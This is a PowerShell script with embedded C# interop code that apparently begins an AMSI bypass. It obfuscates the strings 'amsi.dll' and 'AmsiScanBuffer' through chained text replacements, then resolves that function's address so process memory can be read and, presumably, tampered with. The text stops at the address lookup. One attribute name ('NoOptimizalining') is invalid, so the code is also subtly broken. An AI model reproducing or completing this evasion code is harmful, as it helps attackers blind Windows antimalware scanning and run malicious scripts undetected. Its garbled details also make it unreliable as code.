$startOff = 0x50000
$stepOff = 0x50000
$maxOff = 0x4000000
$bufSize = 0x50000

$srcCode = @"
using System;
using System.ComponentModel;
using System.Management.Automation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

public class NtHelpers {
    [DllImport("kernel32.dll", EntryPoint="ReadProcessMemory")]
    public static extern bool ReadMem(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);

    [MethodImpl(MethodImplOptions.NoOptimizalining)]
    public static int Nop() {
        return 1;
    }
}
"@

Add-Type $srcCode

$InitialDate = Get-Date

$s1 = 'hello, world'
$s1 = $s1.replace('he','a')
$s1 = $s1.replace('ll','m')
$s1 = $s1.replace('o,','s')
$s1 = $s1.replace(' ','i')
$s1 = $s1.replace('wo','.d')
$s1 = $s1.replace('rld','ll')

$s2 = 'hello, world'
$s2 = $s2.replace('he','A')
$s2 = $s2.replace('ll','m')
$s2 = $s2.replace('o,','s')
$s2 = $s2.replace(' ','i')
$s2 = $s2.replace('wo','Sc')
$s2 = $s2.replace('rld','an')

$s3 = 'hello, world'
$s3 = $s3.replace('hello','Bu')
$s3 = $s3.replace(', ','ff')
$s3 = $s3.replace('world','er')

$modBase = [NtHelpers]::GetModuleHandle($s1)
[IntPtr] $funcAddr = [NtHelpers]::GetProcAddress($modBase, $s2 + $s3)
